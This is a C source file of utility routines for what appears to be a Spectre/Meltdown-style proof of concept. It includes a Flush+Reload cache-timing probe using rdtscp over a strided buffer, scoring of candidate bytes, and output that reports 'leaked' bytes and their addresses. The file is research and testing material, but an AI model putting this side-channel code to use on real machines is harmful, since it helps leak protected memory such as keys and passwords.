#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <signal.h>
#include <unistd.h>
#include <x86intrin.h>

#include <utils.h>

int interrupted = 0;

void handle_sigint(int signo, siginfo_t *info, void *ctx)
{
	interrupted = 1;
}

int init_sigint(void)
{
	struct sigaction action = {
		.sa_flags = SA_SIGINFO,
		.sa_sigaction = handle_sigint,
	};

	if (sigemptyset(&action.sa_mask) < 0) {
		return -1;
	}

	if (sigaction(SIGINT, &action, NULL) < 0) {
		return -1;
	}

	return 0;
}

void clear_results(struct hit_count *results)
{
	size_t i;

	for (i = 0; i < 256; ++i) {
		results[i].index = (char)i;
		results[i].count = 0;
	}
}

void time_buffer(struct hit_count *results, unsigned char *buffer, uint64_t threshold)
{
	uint64_t t0, dt;
	unsigned char *p;
	size_t k, x;
	uint32_t core_id;

	for (k = 0; k < 256; ++k) {
		x = ((k * 167) + 13) & 0xff;
		p = buffer + STRIDE * x;

		t0 = __rdtscp(&core_id);
		*(volatile char *)p;
		dt = __rdtscp(&core_id) - t0;

		if (dt < threshold) {
			++results[x].count;
		}
	}
}

int cmp_results(const void *lhs_, const void *rhs_)
{
	const struct hit_count *lhs = lhs_;
	const struct hit_count *rhs = rhs_;

	if (lhs->count > rhs->count) {
		return -1;
	}

	if (lhs->count < rhs->count) {
		return 1;
	}

	return 0;
}

int match_best(unsigned char *byte, size_t *count, struct hit_count *results)
{
	qsort(results, 256, sizeof *results, cmp_results);

	if (!results[0].index) {
		if (!results[0].count) {
			*byte = 0;
			*count = 0;

			return -1;
		}

		if (results[1].count) {
			*byte = results[1].index;
			*count = results[1].count;

			return 0;
		}
	}

	*byte = results[0].index;
	*count = results[0].count;

	return 0;
}

void print_hexstring(const unsigned char *s, size_t len)
{
	const char *digits = "0123456789abcdef";
	size_t i;

	for (i = 0; i < len; ++i) {
		if (i != 0) {
			putc(' ', stdout);
		}

		putc(digits[(*s >> 4) & 0xf], stdout);
		putc(digits[*s & 0xf], stdout);
		++s;
	}
}

void print_string(const unsigned char *s, size_t len)
{
	size_t i;

	for (i = 0; i < len; ++i) {
		putc(isprint(*s) ? *s : '?', stdout);
		++s;
	}
}

void print_result(const unsigned char *s, size_t len, void *src)
{
	printf(" [+] leaked \"");
	print_string(s, len);
	printf("\" (");
	print_hexstring(s, len);
	printf(")");

	if (src) {
		printf(" from %p", src);
	}

	printf("\n");
}

